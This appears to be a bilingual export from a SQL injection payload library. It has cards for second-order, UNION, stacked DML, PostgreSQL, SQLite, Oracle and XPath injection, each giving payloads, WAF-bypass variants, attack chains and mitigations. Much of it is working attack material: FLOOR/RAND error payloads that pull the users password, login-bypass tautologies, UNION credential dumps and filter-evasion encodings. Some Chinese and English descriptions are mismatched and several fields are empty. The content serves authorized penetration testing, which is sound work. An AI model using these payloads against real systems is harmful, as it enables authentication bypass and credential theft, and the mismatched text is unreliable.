prerequisites.en: An isolated transaction uses synthetic users or comments and marker rows only, with later actions read-only or reversible and no real password reset, administrator data, or notification.

title.zh: 存储值闭合与恒真条件探测

description.zh: 用 admin'-- 注释掉后续 SQL、admin' OR '1'='1 构造恒真条件，验证存储值进入第二条查询后的闭合与逻辑可控性。
description.en: Uses admin'-- to comment out the trailing SQL and admin' OR '1'='1 for a tautology, testing closure and logic control once the stored value re-enters a query.

execution.command: admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

description.zh: 以 FLOOR/RAND 报错把第二条查询中 users 表的首个密码带回错误信息，验证存储点触发的报错通道。
description.en: Uses the FLOOR/RAND error to carry the first users password from the second query back in an error message, validating the error channel triggered from the stored value.

description.zh: 以 ' OR '1'='1 构造恒真谓词，验证注入值能否改变认证查询的判定结果。
description.en: Builds the ' OR '1'='1 tautology to test whether the injected value changes the authentication query's verdict.

description.zh: 用 UNION SELECT 直接从 users 表提取用户名与密码，验证第二条查询的列回显位。
description.en: Uses UNION SELECT to extract usernames and passwords from users, validating the second query's reflected columns.

analysis.zh: 阳性证据是同一存储 token 在后续路径脱离绑定参数、改变最终 SQL AST 并访问/影响专用 marker；首次写入与二次执行连续。 假阳性边界：首次保存成功、立即请求可注入、后续普通错误、字符串出现在日志、手工复制到 SQL 控制台、全角引号未标准化或 CONCAT 文本仍作为用户名均不是二阶执行。
analysis.en: Positive evidence requires the same stored token to leave parameter binding in a later path, alter the final SQL AST, and access or affect a dedicated marker, continuously linking initial write and second execution. False-positive boundary: Successful storage, immediate injection, a later ordinary error, strings in logs, manual SQL-console copying, unnormalized full-width quotes, or literal CONCAT text remaining a username does not prove second-order execution.

opsecTips.zh: 二阶 SQL 测试出现真实账户、密码/重置、管理员操作、写入多行、锁等待、通知发送或生产数据时立即停止。
opsecTips.en: Second-order SQL testing stops immediately on real accounts, passwords or resets, administrator actions, multirow writes, lock waits, notifications, or production data.

opsecTips.zh: 回滚/删除合成记录、marker 和任务副本，清理队列/缓存/日志/测试会话，恢复后续参数化后完整回归两阶段流程。
opsecTips.en: Roll back or delete synthetic records, markers, and job copies, clear queues, caches, logs, and test sessions, restore later parameterization, and regress the full two-stage flow.

title.zh: 未闭合注释与 CHAR 拼接变体
title.en: Unclosed comment and CHAR concatenation variants

description.zh: admin'/* 以未闭合注释吞掉后续 SQL；CONCAT(CHAR(...)) 行用码位拼出 "' OR '1'='1"，规避引号字符过滤。
description.en: admin'/* swallows the trailing SQL with an unclosed comment; the CONCAT(CHAR(...)) line rebuilds "' OR '1'='1" from code points to evade quote filtering.

explanation.zh: 未闭合块注释，吞掉存储语句的后续片段
explanation.en: Unclosed block comment swallowing the remainder of the stored statement

explanation.zh: 用 CHAR 码位拼出引号字符，规避引号过滤
explanation.en: Builds quote characters from CHAR code points to evade quote filtering

title.zh: 全角引号与十六进制转义变体
title.en: Fullwidth quote and hex escape variants

wafBypass.command:
admin＇ OR ＇1＇=＇1
test@test.com' UNION SELECT password FROM users WHERE '1'='1
\x27 OR 1=1--

description.zh: 分别用全角引号（＇）、UNION 变体与 \x27 十六进制转义构造条件，验证依赖字符形态的过滤是否被绕过。
description.en: Builds conditions with fullwidth quotes, a UNION variant, and the \x27 hex escape to test filters that depend on character form.

description.zh: 绕过只解码一次的输入过滤：闭合引号与注释二次编码；二阶查询报错即成功。
description.en: Double-encode the closing quote and comment past single-decode filters; an error in the second-order query confirms success.

description.zh: 绕过区分大小写且按空格分词的规则：用户名混合大小写并注释占位；存储后二次执行生效即成功。
description.en: Mix case and pad with comments against case-sensitive tokenizers; effectiveness on second-order execution confirms success.

description.zh: 探测二阶查询非常规闭合并绕过引号过滤：反引号/括号闭合变体；二次查询报错语义变化即成功。
description.en: Probe non-standard closures against quote filtering; changed error semantics in the second-order query confirm success.

title.zh: 存储的SQL注入 (注册用户 -> 登录触发)
title.en: Stored SQL injection (registered user -> login trigger)

wafBypass.command:
admin' --
admin" #
admin"/*
admin') --
admin") --
admin') #
admin") #
admin')/*
admin")/*
admin' OR '1'='1'--
admin" OR "1"="1"--
admin' OR '1'='1'#
admin" OR "1"="1"#
admin' OR '1'='1'/*
admin" OR "1"="1"/*
admin' OR 1=1#
admin" OR 1=1#
admin' OR 1=1/*
admin" OR 1=1/*
admin' UNION SELECT NULL--
admin" UNION SELECT NULL--
admin' UNION SELECT NULL,NULL--
admin" UNION SELECT NULL,NULL--
admin' UNION SELECT NULL,NULL,NULL--
admin" UNION SELECT NULL,NULL,NULL--
admin' AND SLEEP(3)--
admin" AND SLEEP(3)--
admin' AND 1=1--
admin" AND 1=1--
admin' AND 1=2--
admin" AND 1=2--
admin' WAITFOR DELAY '0:0:3'--
admin" WAITFOR DELAY '0:0:3'--
admin'; SELECT SLEEP(3)--
admin"; SELECT SLEEP(3)--
admin'-(SELECT 1 FROM (SELECT SLEEP(3))a)-
admin"-(SELECT 1 FROM (SELECT SLEEP(3))a)-
admin'+(SELECT 1 FROM (SELECT SLEEP(3))a)+

description.zh: 先以注册/存储字段保存 admin'-- 与恒真、UNION、SLEEP/WAITFOR 变体，再触发登录或查询路径；后续查询行为改变（认证绕过、延迟约 3 秒或回显数据）即确认二阶（存储型）SQL 注入成立。
description.en: Store admin'-- plus tautology, UNION, and SLEEP/WAITFOR variants via a registration/storage field, then trigger the login or query path; altered downstream behavior (auth bypass, ~3-second delay, or reflected data) confirms second-order (stored) SQL injection.

title.zh: 存储点提交闭合恒真载荷
title.en: Plant closure-tautology payloads at the storage point

description.zh: 在注册、资料等写入处提交注释截断与 OR 恒真变体，载荷先落地存储，等待后续查询取出时触发二次注入生效。
description.en: Submit admin'-- and OR-tautology variants at registration or profile fields so the payload lands in storage awaiting later execution.

title.zh: 恒真条件绕过二次查询
title.en: Bypass the downstream query with tautologies

description.zh: 存储值被拼进登录等后续 SQL 时恒真条件整体命中，OR 恒真使校验直接通过，拿到本不可达的授权会话。
description.en: When the stored value is concatenated into a later query, the OR tautology forces the check to pass and yields an unauthorized session.

description.zh: 换用报错型存储载荷，二次查询执行时 FLOOR 报错把 users 表口令字段带回页面，实现无直接回显点的数据提取。
description.en: Switch to error-based stored payloads; on second execution FLOOR errors carry the users password column back to the page.

attackChain.payload: admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

description.zh: 引号或其字符形态被过滤时，存储载荷改用全角引号、\x27 十六进制转义或 CONCAT(CHAR(...)) 码位拼接形态写入；二次查询行为仍被改变（报错、恒真或回显异常）即确认过滤被绕过。
description.en: Make the stored payload UNION SELECT username,password so the later query outputs whole credential rows, completing the second-order dump.

title.zh: 过滤时换全角与十六进制变体
title.en: Use fullwidth and hex variants when filtered

description.zh: 存储载荷改为联合查询同时选取用户名与口令两列，二次查询输出即整表凭据行，完成二阶链路的数据收割闭环。
description.en: When quotes are escaped, rewrite the payload with fullwidth quotes or \x27 hex escapes to dodge escaping while keeping step 4 semantics.

attackChain.payload:
admin＇ OR ＇1＇=＇1
test@test.com' UNION SELECT password FROM users WHERE '1'='1
\x27 OR 1=1--

overview.zh: 覆盖二阶 SQL 注入的存储到触发验证：首次写入时作为数据保存的值，在登录、密码修改等后续路径被重新拼接进 SQL。包含闭合注释、报错提取、恒真登录绕过与 UNION 提取四种触发形态。
overview.en: Covers stored-to-trigger verification of second-order SQL injection: values saved as data on first write are later re-concatenated into SQL on login, password-change, and similar paths. Four trigger forms are included: closure comments, error-based extraction, always-true login bypass, and UNION extraction.

vulnerability.zh: 根因是写入路径参数化了输入，但读取该值的后续查询仍用字符串拼接构造 SQL，存储数据被误当作可信代码；缺少对存储值的同等参数化处理时，二阶注入即成立。
vulnerability.en: The root cause is write paths parameterizing input while later queries reading that value build SQL by string concatenation, treating stored data as trusted code. Without equally parameterized handling of stored values, second-order injection holds.

exploitation.zh: 按 Payload 列表顺序使用：先在注册/资料页把 admin'-- 或 admin' OR '1'='1 存入账户字段，再触发登录等后续路径；第 1 步验证存储值的闭合与逻辑可控，第 2 步以 FLOOR/RAND 报错把第二条查询的数据带回错误信息，第 3 步验证恒真登录绕过，第 4 步用 UNION 提取凭据。被 WAF 拦截时改用 CHAR 拼接或全角引号变体。
exploitation.en: Use in Payload list order: first store admin'-- or admin' OR '1'='1 in an account field via registration or profile pages, then trigger the later path such as login; step 1 verifies closure and logic control of the stored value, step 2 brings back second-query data via FLOOR/RAND errors, step 3 verifies the always-true login bypass, and step 4 extracts credentials via UNION. When blocked by a WAF, switch to CHAR-concatenation or fullwidth-quote variants.

mitigation.zh: 后续查询同样使用绑定参数，存储值一律作为数据而非 SQL 片段，动态标识符映射固定值。修复后以存储型载荷回归注册到登录全链路，确认查询结构不再被改变。
mitigation.en: Use bound parameters in later queries too, always treat stored values as data rather than SQL fragments, and map dynamic identifiers to fixed values. After the fix, regression-test the full registration-to-login chain with stored payloads to confirm query structure stays unchanged.

overview.zh: 覆盖 UNION 注入的列对齐与只读查询验证链：ORDER BY 递增与 UNION NULL 序列确定列数，固定 marker 定位回显列，再读取 users 表与 information_schema 元数据。适用于已确认注入点、走 UNION 读取路径的场景。
overview.en: Covers the column-alignment and read-only query chain for UNION injection: ORDER BY increments and UNION NULL sequences to fix the column count, a fixed marker to locate echo columns, then reading the users table and information_schema metadata. Suitable once an injection point is confirmed and the UNION read path is available.

vulnerability.zh: 根因是输入拼接进 SQL 且查询结果直接回显，攻击者用 UNION 追加等列数的 SELECT 即可把任意查询结果并入原结果集；缺少参数化与列类型校验时读取链直接成立。
vulnerability.en: The root cause is input concatenated into SQL with query results echoed directly: a UNION appends an equal-column SELECT merging arbitrary query results into the original set. Without parameterization and column-type checks, the read chain stands immediately.

exploitation.zh: 使用第 1 步主验证命令：先以 ORDER BY 递增确定列数上限，再用 UNION SELECT NULL 序列验证列数与类型占位，固定 marker 定位回显列；回显出现 marker 与数据即确认 UNION 读取链可用，随后读取 users 表与 information_schema 元数据。执行前把 PAYLOADER_MARKER 替换为本次隔离环境的专用标记；被 WAF 拦截时参考绕过区的受控变体。
exploitation.en: Use the step 1 main verification command: cap the column count with increasing ORDER BY, verify count and type slots with UNION SELECT NULL sequences, and locate echo columns with a fixed marker; an echoed marker and data confirm the UNION read chain, after which read the users table and information_schema metadata. Replace table names with isolated markers beforehand; when blocked by a WAF, use the controlled variants in the bypass section.

mitigation.zh: 参数化查询消除 UNION 注入面，按列校验返回数据类型；修复后重放 ORDER BY/UNION 载荷应报列不匹配，回显区不再出现注入内容。
mitigation.en: Eliminate the UNION injection surface with parameterized queries and validate returned column types; after the fix, replaying ORDER BY/UNION payloads must raise column-mismatch errors and no injected content may appear in echo areas.

'; BEGIN; CREATE TEMP TABLE payloader_marker(value text) ON COMMIT DROP; INSERT INTO payloader_marker(value) VALUES ('PAYLOADER_MARKER'); SELECT value FROM payloader_marker; ROLLBACK;--

description.en: Use a savepoint-scoped rollback to validate the write path while evading full-ROLLBACK signatures; a visible insert that then reverts confirms success.

wafBypass.command: ';WITH t AS (INSERT INTO payloader_marker VALUES('PAYLOADER_MARKER') RETURNING 1) SELECT count(*) FROM t;ROLLBACK;-- -

description.en: Wrap the DML inside a CTE to evade direct INSERT VALUES detection; a returned count of 1 with no residue after rollback confirms success.

description.en: Close each statement group with ROLLBACK so temp tables vanish and no persistent change remains, keeping the chain repeatable.

overview.zh: 覆盖堆叠 DML 语句的无副作用验证形态：在同一事务内对临时表执行 INSERT/UPDATE/DELETE 并在提交前回滚，以 marker 输出与无残留数据证明 DML 可注入。适用于评估堆叠能力能否升级为写操作的场景。
overview.en: Covers the side-effect-free verification form of stacked DML: running INSERT/UPDATE/DELETE against a temporary table inside one transaction and rolling back before commit, using marker output and zero residue to prove DML injectability. Suitable for assessing whether stacking escalates to write operations.

vulnerability.zh: 根因是注入点具备堆叠执行能力且应用账户持有 DML 权限，攻击者可追加任意写语句；事务回滚只是验证期的无副作用形态，真实攻击中提交即持久化，DML 权限过宽是风险根源。
vulnerability.en: The root cause is stacked execution at the injection point plus DML grants on the application account, letting attackers append arbitrary write statements. Transaction rollback is only the verification-time side-effect-free form; in real attacks a commit persists, and overly broad DML grants are the source of risk.

exploitation.zh: 使用第 1 步命令在同一事务内对临时表执行 INSERT/UPDATE/DELETE 并在提交前 ROLLBACK；输出始终为 marker 且库中无残留数据即确认 DML 可注入且回滚保证无副作用。只在授权环境的临时表上操作，不得对业务表执行或提交任何写语句。
exploitation.en: Use the step 1 command to run INSERT/UPDATE/DELETE against a temporary table in one transaction and ROLLBACK before commit; constant marker output with zero database residue confirms DML injectability while rollback guarantees no side effects. Operate only on temporary tables in the authorized environment; never run or commit writes against business tables.

mitigation.zh: 应用账户按需授予最小 DML 权限并禁止堆叠语句，参数化消除注入点；修复后堆叠 DML 应报语法错误，并以审计确认无未授权写操作发生。
mitigation.en: Grant the application account minimal DML as needed, forbid stacked statements, and eliminate injection with parameterization; after the fix, stacked DML must raise syntax errors and audits must confirm no unauthorized writes occurred.

name.zh: SQL 等价表达式替换

description.zh: 用 GREATEST 等价谓词、JOIN 派生表列对齐与 CAST 定型回显（含 MySQL/Oracle 方言）重写同一攻击语义，验证仅匹配关键字字面形态的防护是否放行。
description.en: Routes every source line belonging to DBMS-Scoped SQL Equivalent Expressions into one focused card with explicit syntax or carrier prerequisites, evidence chains, and false-positive boundaries.

subCategory.zh: 编码与 WAF 等价变体

prerequisites.zh: 仅在隔离实例确认DBMS 标注 SQL 等价表达式所需 DBMS、驱动、代理或解析器行为，不跨技术分支推断结果。
prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by DBMS-Scoped SQL Equivalent Expressions in an isolated instance and do not infer results across technique branches.

prerequisites.zh: 准备固定 PAYLOADER_MARKER、阴性/阳性对照、最终语句或原始字节日志及短超时；真实数据和生产流量不得使用。
prerequisites.en: Prepare a fixed PAYLOADER_MARKER, negative and positive controls, final-statement or raw-byte logs, and short timeouts; do not use real data or production traffic.

title.zh: DBMS 标注 SQL 等价表达式主验证命令
title.en: DBMS-Scoped SQL Equivalent Expressions Primary Validation

execution.command:
' AND GREATEST(1,0)--
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
' UNION SELECT CAST('PAYLOADER_MARKER' AS VARCHAR2(32)) FROM DUAL-- -

description.zh: 以 GREATEST、JOIN 派生表与 CAST 等价表达式构造恒真与列对齐；语句仍执行并回显 marker 即确认表达式等价变体可用于绕过关键字检测。
description.en: Build tautologies and column alignment with GREATEST, JOIN-derived tables, and CAST equivalents; the statement still executing and reflecting the marker confirms expression-equivalent variants evade keyword detection.

analysis.zh: DBMS 标注 SQL 等价表达式的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for DBMS-Scoped SQL Equivalent Expressions requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.

wafBypass.command:
1' AND COALESCE(NULL,1)=1--
1' AND NULLIF(1,2) IS NULL--

description.zh: 绕过对等号比较和常见函数的过滤：用集合函数构造等价布尔谓词；真/假条件响应可区分即成功。
description.en: Construct equivalent boolean predicates with set functions to evade equals-sign and common-function filters; distinguishable true/false responses confirm success.

title.zh: IIS 宽字节 Unicode 编码

description.zh: 绕过不识别 %u 系列编码的 WAF（IIS 场景）：用 %u0027 表示引号；数据库报错或条件差异出现即成功。
description.en: Use %u-style encoding for the quote on IIS targets whose WAF misses this form; a database error or conditional difference confirms success.

description.zh: 绕过对 UNION 关键字与空格分隔的规则：用 JOIN 链替代 UNION 对齐列数并混淆大小写；三列回显即成功。
description.en: Replace UNION column alignment with a JOIN chain and mixed case; a three-column echo confirms success.

title.zh: 等价函数替代被滤运算符

description.zh: 等号或比较运算符被过滤时用等价函数构造真假判断，布尔语义保持完整不变，盲注推理链路不被过滤规则打断。
description.en: When '=' is filtered, rebuild true/false tests with functions like GREATEST so boolean semantics survive for blind chains.

attackChain.payload:

' UNION SELECT CAST('PAYLOADER_MARKER' AS VARCHAR2(32)) FROM DUAL-- -

title.zh: JOIN 链替代 UNION 对齐
title.en: Align with JOIN chains instead of UNION

description.zh: UNION 后的数字列清单被特征拦截时，改用派生表 JOIN 链生成等列数结果替代显式列清单（UNION 关键字仍在），联合语义不变，同样把目标数据并入结果行完成读取。
description.en: If UNION is blocked, join subqueries one by one to align columns, matching union semantics and merging target data into rows.

title.zh: CAST 固定类型稳定回显

description.zh: 用 CAST 把标记值定型为定长字符串，规避隐式类型转换导致的报错，保证回显位内容稳定可读利于提取。
description.en: CAST markers into fixed-length strings to avoid implicit-conversion errors and keep the echo position reliably readable.

attackChain.payload:

overview.zh: 覆盖 DBMS 标注的 SQL 等价表达式变体：以 GREATEST、JOIN 派生表与 CAST 等价构造恒真与列对齐。适用于关键字过滤拦截 AND/OR/UNION 等字面形态、需要等价表达式维持注入链的场景。
overview.en: Covers DBMS-annotated SQL equivalent-expression variants: building always-true conditions and column alignment via GREATEST, JOIN-derived tables, and CAST equivalences. Suitable when keyword filtering blocks literal AND/OR/UNION shapes and equivalent expressions are needed to keep the injection chain alive.

vulnerability.zh: 根因是注入点存在而检测按固定关键字签名匹配；SQL 表达式语义等价但字面形态多样，签名覆盖不了等价嵌套时过滤即被绕过。
vulnerability.en: The root cause is a live injection point with detection matching fixed keyword signatures; SQL expressions are semantically equivalent but vary in literal shape, and signatures that miss equivalent nestings are bypassed.

exploitation.zh: 使用第 1 步命令以 GREATEST、JOIN 派生表与 CAST 等价表达式构造恒真与列对齐；语句仍执行并回显 marker 即确认表达式等价变体可用于绕过关键字检测。先确认原始形态被拦截作为对照，再逐个等价形式验证并记录各自效果。
exploitation.en: Use the step 1 command to build always-true conditions and column alignment via GREATEST, JOIN-derived tables, and CAST equivalents; statements still executing and echoing the marker confirm the equivalent-expression variants bypass keyword detection. First confirm the original form is blocked as a control, then verify each equivalent form one by one and record its effect.

mitigation.zh: 参数化查询消除注入面，检测按解析后的查询结构而非字面签名匹配；修复后重放全部等价表达式应被同样处理，回归测试覆盖完整变体族。
mitigation.en: Eliminate the injection surface with parameterized queries and match detection on parsed query structure rather than literal signatures; after the fix, replaying all equivalent expressions must be handled identically, with regression tests covering the full variant family.

name.zh: PostgreSQL 时间与报错注入

description.zh: 使用 pg_sleep、类型转换和会话函数构造时间或报错证据，验证输入是否进入 PostgreSQL 表达式。
description.en: Uses pg_sleep, casts, and session functions to build timing or error evidence that input reached a PostgreSQL expression.

prerequisites.zh: 确认 PostgreSQL 版本、驱动多语句策略和参数所在的语句或表达式位置，避免误用其他方言。
prerequisites.en: Confirm the PostgreSQL version, the driver's multi-statement policy, and whether the parameter occupies a statement or expression position to avoid cross-dialect assumptions.

prerequisites.zh: 为测试连接设置 application_name 或等价会话标签，并采集 pg_stat_activity、错误日志和交错延迟基线。
prerequisites.en: Tag test connections with application_name or an equivalent session label, and collect pg_stat_activity, error logs, and interleaved latency baselines.

description.en: Stacked '; SELECT pg_sleep and the boolean AND (SELECT pg_sleep(3)) IS NOT NULL are the valid delay forms; pg_sleep returns void and cannot be an OR operand or appear in FROM, so those invalid lines were removed.

analysis.zh: 阳性是恒真条件下的 pg_sleep 样本与恒假条件形成稳定分布差异且可关联到数据库会话，或受控字符串通过 CAST 错误通道返回。驱动拒绝分号、普通网络抖动、statement_timeout、函数返回类型错误或单次慢查询都是假阳性边界。
analysis.en: A positive result is a stable timing-distribution difference between true-branch pg_sleep samples and false controls correlated to database sessions, or a controlled string returned through a CAST error channel. Driver rejection of semicolons, ordinary network jitter, statement_timeout, function return-type errors, or one slow query are false-positive boundaries.

opsecTips.zh: 交错样本达到预定统计阈值后停止，不增加 sleep 时长或并发数来强化现象。
opsecTips.en: Stop after interleaved samples reach the predetermined statistical threshold; do not increase sleep duration or concurrency to amplify the effect.

opsecTips.zh: 取消带测试标签的活动会话，恢复 statement_timeout，删除临时标记数据并移除诊断日志。
opsecTips.en: Cancel active tagged sessions, restore statement_timeout, delete temporary marker data, and remove diagnostic logs.

description.zh: 绕过对 pg_sleep 直接调用的特征：包进 CASE 条件结构；真假条件延迟可区分即成功。
description.en: Wrap pg_sleep inside a CASE conditional; distinguishable delays between true and false conditions confirm success.

description.zh: 绕过对 pg_sleep 函数名的封锁：大序列聚合计数制造纯计算延迟；响应显著变慢即成功。
description.en: Induce pure computation delay via a huge series aggregation when pg_sleep is blocked; a clearly slower response confirms success.

description.zh: 绕过基于空格分词的规则：函数调用全部括号化紧排；延迟仍触发即成功。
description.en: Fully parenthesize calls with no spaces against space-based tokenizers; the delay still triggering confirms success.

description.en: Append pg_sleep after a quote closure; three-to-five second stalls confirm the PostgreSQL injection and timing channel.

description.zh: 给延迟语句加真假条件分支构造时间信号源，按位推断库名表名与字段值，最终把目标表内容完整推出数据库边界。
description.en: Branch the delay on true/false conditions as an oracle, inferring names and values bit by bit until tables are fully recovered.

overview.zh: 覆盖 PostgreSQL 的时间与报错注入验证：堆叠 '; SELECT pg_sleep 与布尔式 AND (SELECT pg_sleep(3)) IS NOT NULL 为有效延迟探测形式，配合 CAST 报错确认表达式执行。
overview.en: Covers timing and error-based injection verification for PostgreSQL: stacked '; SELECT pg_sleep and boolean AND (SELECT pg_sleep(3)) IS NOT NULL as valid delay-probe forms, plus CAST errors confirming expression execution.

vulnerability.zh: 根因是拼接式 PostgreSQL 查询允许输入改变谓词、追加语句或调用函数，错误回显与宽权限泄露会话与数据库信息；pg_sleep 返回 void，不能作为 OR/AND 布尔操作数或与数值直接比较。
vulnerability.en: The root cause is concatenated PostgreSQL queries letting input alter predicates, append statements, or call functions, with error echo and broad privileges leaking session and database information; pg_sleep returns void, invalid as an OR operand or inside FROM.

exploitation.zh: 使用第 1 步命令中堆叠 '; SELECT pg_sleep 与布尔式 AND (SELECT pg_sleep(3)) IS NOT NULL 两种有效延迟形式。建立无延时统计基线后，用最短可识别的 pg_sleep 真假分支或固定字符串 CAST 错误作为独立证据；将响应耗时与 pg_stat_activity、慢查询日志关联，排除网络抖动与锁等待。
exploitation.en: Use the step 1 command's two valid delay forms — stacked '; SELECT pg_sleep and boolean AND (SELECT pg_sleep(3)) IS NOT NULL, with invalid-syntax rows removed per PostgreSQL semantics. After a no-delay statistical baseline, use the shortest recognizable pg_sleep true/false branch or fixed-string CAST errors as independent evidence; correlate response times with pg_stat_activity and slow-query logs, excluding network jitter and lock waits.

mitigation.zh: 使用 PostgreSQL 驱动绑定参数，限制连接角色权限，统一错误映射，设置语句超时并检测异常 pg_sleep 与转换失败；修复后重放应无延迟差异。
mitigation.en: Bind parameters via the PostgreSQL driver, restrict connection-role privileges, unify error mapping, set statement timeouts, and detect abnormal pg_sleep and conversion failures; after the fix, replays must show no delay differentials.

analysis.zh: 阳性要求受控表达式在恒真分支中随 randomblob 尺寸呈可重复的资源或时延增长，或 sqlite_version 固定标记经可观察列返回，并能在进程内查询记录中对应。主机本身高负载、一次 OOM、数据库锁、页面超时或服务崩溃不构成可靠注入证明。

overview.zh: 覆盖 SQLite 的资源消耗型时间探测验证：以 randomblob 资源消耗与 LIKE+RANDOMBLOB 变体制造延迟，按数据量大小对照区分延迟来源，识别嵌入式查询注入。
overview.en: Covers resource-consumption timing probes for SQLite: creating delays with randomblob consumption and LIKE+RANDOMBLOB variants, contrasting delay sources by data size to identify embedded-query injection.

vulnerability.zh: 根因是输入被拼进 SQLite 表达式后可调用内置函数或访问系统表；SQLite 常与应用进程共享 CPU 和内存，昂贵表达式同时影响可用性，需控制数据量规模。
vulnerability.en: The root cause is input concatenated into SQLite expressions invoking built-in functions or reaching system tables; SQLite typically shares CPU and memory with the application process, so expensive expressions also affect availability — control data sizes carefully.

exploitation.zh: 使用第 1 步命令以 randomblob 资源消耗与 LIKE+RANDOMBLOB 变体制造延迟，末两行作布尔对照；响应明显变慢且随 blob 参数减小而缩短即确认 SQLite 注入可造成可控时延。先测量固定数据集基线，再从低规模逐级增加并对比恒假分支，观察进程 CPU、内存与超时，禁止重复最大值。
exploitation.en: Use the step 1 command to create delays with randomblob consumption and LIKE+RANDOMBLOB variants, with the last two rows as boolean controls; markedly slower responses shrinking as the blob parameter decreases confirm SQLite injection produces controllable latency. Measure a fixed-dataset baseline first, then scale up from low sizes against the always-false branch while watching process CPU, memory, and timeouts — never repeat maximum values.

mitigation.zh: 使用 SQLite 绑定参数，设置执行预算、进度处理器与并发限制，限制数据库文件权限并监控异常大 BLOB 与长查询；修复后重放应无规模相关延迟。
mitigation.en: Bind SQLite parameters, set execution budgets, progress handlers, and concurrency limits, restrict database-file permissions, and monitor abnormally large BLOBs and long queries; after the fix, replays must show no size-dependent delays.

description.en: Align a DUAL-backed UNION, place target columns in echo slots, and walk rows to finish the dump.

overview.zh: 覆盖 Oracle 的布尔、报错与 UNION 三通道注入验证：布尔对照、utl_inaddr/ctxsys/to_number/cast 报错与 UNION NULL 列数探测，并排除跨方言残留语法。
overview.en: Covers three-channel injection verification for Oracle — boolean, errors, and UNION: boolean comparisons, utl_inaddr/ctxsys/dbms_utility/to_number/cast/extractvalue error functions, and UNION NULL column probes, with cross-dialect leftovers excluded.

vulnerability.zh: 根因是输入拼入 Oracle SQL 后可修改谓词、追加 UNION 或触发转换与包函数异常；过宽字典视图与网络包权限扩大泄露面，MySQL 风格十六进制与 XML 函数写法需按版本筛除。
vulnerability.en: The root cause is input concatenated into Oracle SQL able to modify predicates, append UNIONs, or trigger conversion and package-function exceptions; overly broad dictionary views and network package privileges widen disclosure, while MySQL-style hex and XML function syntax must be filtered by version.

exploitation.zh: 使用第 1 步命令逐行提交布尔对照、各报错函数与 UNION NULL 列数探测；对应行出现响应差异或报错回显数据即确认该形式在目标 Oracle 可用。先用 DUAL 与合法函数确认版本，再以真假谓词、NULL FROM DUAL 或版本支持的固定转换错误选择单一证据通道；跨方言语法错误与包未授权按阴性记录。
exploitation.en: Use the step 1 command to submit boolean comparisons, each error function, and UNION NULL column probes line by line; response differences or error-echoed data on a row confirm that form works on the target Oracle. Confirm the version via DUAL and legal functions first, then pick a single evidence channel among true/false predicates, NULL FROM DUAL, or version-supported fixed conversion errors; cross-dialect syntax errors and unauthorized packages record as negatives.

mitigation.zh: 使用 Oracle 绑定变量，允许列表映射动态标识符，撤销不必要字典视图、UTL_* 包与网络 ACL 并统一 ORA 错误；修复后重放各通道应无差异。
mitigation.en: Use Oracle bind variables with allowlist-mapped dynamic identifiers, revoke unnecessary dictionary views, UTL_* packages, and network ACLs, and unify ORA errors; after the fix, replaying each channel must show no differences.

description.en: Submit XPath closure, node-count, and substring character-extraction variants line by line; stable response differences between true and false conditions confirm boolean-enumerable XPath injection.

analysis.zh: 阳性要求恒真 XPath 条件稳定返回预置 canary 节点或计数，而恒假条件不返回，且编译查询显示输入越过字符串边界。XML 解析错误、命名空间不匹配、正常搜索命中、页面回显表达式、或猜中常见节点名都不是 XPath 注入证据。
analysis.en: Positive evidence requires the true XPath condition to reproducibly return the preset canary node or count while the false condition does not, with the compiled query showing input crossing the string boundary. XML parse errors, namespace mismatch, legitimate search matches, expression reflection, or guessing a common node name are not XPath-injection evidence.

opsecTips.zh: 首次通过真/假条件定位到 canary 节点后停止，不枚举生产 XML 的用户、密码或完整树结构。
opsecTips.en: Stop after the first true/false pair locates the canary node; do not enumerate users, passwords, or the full tree of production XML.

opsecTips.zh: 删除测试 XML 和 canary，清除编译查询与响应缓存，并恢复命名空间配置和参数化 XPath 构造。

description.zh: 绕过对整节点回显的过滤：按字符位置切片做布尔盲提取；真假条件可区分即成功。

description.en: Compare characters with substring position tests; branch differences rebuild node text such as usernames and passwords.

overview.zh: 覆盖 XPath 表达式注入的布尔化枚举验证：闭合 XPath 字面量后以布尔谓词、节点计数与 substring 条件逐字符提取。适用于输入拼接进 XPath 查询的 XML 数据源场景。
overview.en: Covers boolean-style enumeration for XPath expression injection: closing the XPath literal, then extracting character by character via boolean predicates, node counts, and substring conditions. Suitable for XML data sources where input is concatenated into XPath queries.

vulnerability.zh: 根因是输入被插入 XPath 字面量或谓词，可关闭原字符串并追加 or、节点选择或函数；许多 XML API 缺少统一参数绑定，与 SQL 注入同源但针对 XML 查询。
vulnerability.en: The root cause is input inserted into XPath literals or predicates, closing the original string and appending or-expressions, node selections, or functions; many XML APIs lack unified parameter binding, making this SQL-injection-like but targeting XML queries.

exploitation.zh: 使用第 1 步命令逐行提交 XPath 闭合、节点计数与 substring 逐字符提取变体；响应随条件真假出现稳定差异即确认 XPath 注入可布尔化枚举。先用受控账户建立匹配/不匹配基线，再以相同闭合方式发送真假谓词，盲测只对测试节点做 count 或单字符判断。
exploitation.en: Use the step 1 command to submit XPath closures, node counts, and substring character-by-character extraction variants line by line; stable response differences across true/false conditions confirm boolean-enumerable XPath injection. Build matched/unmatched baselines with a controlled account first, then send true/false predicates with the same closure, limiting blind tests to count or single-character checks on test nodes.

mitigation.zh: 使用固定 XPath 与变量解析器，不拼接路径或谓词；无变量 API 时用经过验证的字面量编码器并限制 XML 访问权限；修复后重放真假谓词响应应无差异。
